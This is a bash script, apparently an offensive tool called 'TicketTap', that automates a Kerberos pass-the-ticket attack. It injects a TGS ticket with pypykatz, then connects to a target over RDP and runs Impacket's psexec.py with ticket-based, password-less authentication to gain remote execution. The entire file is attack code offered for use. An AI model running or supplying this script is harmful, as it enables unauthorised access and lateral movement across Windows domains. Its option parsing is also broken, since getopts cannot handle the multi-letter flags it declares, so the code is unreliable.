#!/bin/bash

# Function to display usage information
usage() {
    echo "TicketTap Usage: $0 -u <username> -t <tgsFile> -m <pypykatzPath> [-ip <target_ip>] [-psexec <psexecPath>] [-d <domain>] [-pu <psexecUser>]"
    exit 1
}

# Parse command-line flags
while getopts ":u:t:m:ip:d:pu:" opt; do
    case ${opt} in
        u ) # Username
            username=$OPTARG
            ;;
        t ) # Path to TGS file
            tgsFile=$OPTARG
            ;;
        m ) # Path to pypykatz
            pypykatzPath=$OPTARG
            ;;
        ip ) # Target IP address
            targetIP=$OPTARG
            ;;
        psexec ) # Path to Impacket's psexec.py
            psexecPath=$OPTARG
            ;;
        d ) # Domain name
            domain=$OPTARG
            ;;
        pu ) # PsExec Username
            psexecUser=$OPTARG
            ;;
        * )
            usage
            ;;
    esac
done

# Check required flags
if [ -z "$username" ] || [ -z "$tgsFile" ] || [ -z "$pypykatzPath" ]; then
    echo "Error: Username, TGS file, and pypykatz path are required."
    usage
fi

# Function to inject the TGS using pypykatz
function inject_ticket() {
    echo "Injecting TGS for user $username using pypykatz..."
    python3 $pypykatzPath kerberos ptt $tgsFile
}

# Function to initiate RDP connection
function rdp_connection() {
    echo "Attempting RDP connection to $targetIP..."
    rdesktop -u "$username" $targetIP
}

# Function to use Impacket's PsExec
function use_psexec() {
    echo "Running PsExec on $targetIP with user $psexecUser@$domain..."
    python3 $psexecPath $psexecUser@$domain -k -no-pass $targetIP
}

# Main Execution
inject_ticket

# Attempt RDP connection if IP is provided
if [ ! -z "$targetIP" ]; then
    rdp_connection
fi

# Attempt PsExec if psexec path, domain, and username are provided
if [ ! -z "$psexecPath" ] && [ ! -z "$domain" ] && [ ! -z "$psexecUser" ]; then
    use_psexec
fi
